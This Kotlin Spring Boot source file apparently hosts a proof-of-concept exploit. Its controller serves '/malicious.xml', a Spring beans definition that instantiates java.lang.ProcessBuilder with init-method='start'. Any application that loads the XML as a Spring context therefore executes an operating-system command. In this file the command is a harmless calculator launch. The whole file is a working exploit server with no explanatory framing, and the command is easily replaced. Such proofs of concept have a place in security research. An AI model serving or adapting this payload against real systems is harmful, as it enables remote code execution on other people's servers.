package com.applicationsec

import org.springframework.http.HttpHeaders
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.RestController

@RestController
class XmlPocController {

    @get:GetMapping("/malicious.xml")
    val xml: ResponseEntity<String>
        get() {
            val headers = HttpHeaders()
            headers.add(HttpHeaders.CONTENT_TYPE, "application/xml; charset=UTF-8")
            return ResponseEntity.ok().headers(headers).body(XML_CONTENT)
        }

    companion object {
        private val XML_CONTENT = """
        <?xml version="1.0" encoding="UTF-8" ?>
        <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
            <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
                <constructor-arg>
                <list>
                    <value>open</value>
                    <value>-a</value>
                    <value>calculator</value>
                </list>
                </constructor-arg>
            </bean>
        </beans>
        """.trimIndent()
    }
}